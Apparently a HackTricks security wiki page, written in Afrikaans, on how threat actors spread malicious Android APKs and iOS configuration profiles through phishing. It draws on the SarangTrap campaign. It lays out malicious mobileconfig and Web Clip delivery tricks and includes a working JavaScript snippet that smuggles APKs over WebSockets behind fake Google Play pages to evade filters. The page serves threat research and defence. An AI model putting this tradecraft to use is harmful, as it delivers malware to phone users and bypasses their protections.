# Mobile Phishing & Kwaadwillige App Verspreiding (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakteurs gebruik word om **kwaadwillige Android APKs** en **iOS mobile-configuration profiles** deur phishing te versprei (SEO, social engineering, fake stores, dating apps, ens.).
> Die materiaal is aangepas van die SarangTrap-veldtog wat deur Zimperium zLabs (2025) blootgelê is en ander openbare navorsing.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registreer dosyne look-alike domains (dating, cloud share, car service…).
– Gebruik plaaslike taal sleutelwoorde en emojis in die `<title>` element om in Google te rangskik.
– Host *beide* Android (`.apk`) en iOS install instructions op dieselfde landing page.
2. **First Stage Download**
* Android: direkte skakel na 'n *unsigned* of “third-party store” APK.
* iOS: `itms-services://` of plain HTTPS skakel na 'n kwaadwillige **mobileconfig** profile (sien hieronder).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection, en ander post-install malware behaviour word gedek op die toegewyde Android Malware Post-Exploitation bladsy hieronder.
4. **iOS Delivery Technique**
* 'n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. aanvra om die toestel in “MDM”-agtige supervision te registreer.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* drie keer (screenshots op die phishing page).
3. Trust the unsigned profile ➜ attacker kry *Contacts* & *Photo* entitlement sonder App Store review.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads kan **'n phishing URL op die Home Screen vaspen** met 'n branded icon/label.
* Web Clips kan **full-screen** loop (versteek die browser UI) en as **non-removable** gemerk word, wat die slagoffer dwing om die profile te delete om die icon te verwyder.
6. **Network Layer**
* Plain HTTP, dikwels op port 80 met HOST header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → maklik om raak te sien).

## Android Malware Post-Exploitation

Vir post-install Android malware tradecraft soos C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, en persistence, sien:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Aanvallers vervang toenemend statiese APK-skakels met 'n Socket.IO/WebSocket channel ingebed in Google Play-agtige lures. Dit verberg die payload URL, omseil URL/extension filters, en behou 'n realistiese install UX.

Tipiese client flow waargeneem in die wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Waarom dit eenvoudige kontroles ontduik:
- Geen statiese APK-URL word blootgestel nie; die payload word in geheue herbou vanaf WebSocket-frames.
- URL/MIME/extensie-filters wat direkte .apk-antwoorde blokkeer, kan binêre data wat via WebSockets/Socket.IO getunnel word, miskyk.
- Crawlers en URL-sandboxes wat nie WebSockets uitvoer nie, sal nie die payload ophaal nie.

Sien ook WebSocket tradecraft en tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
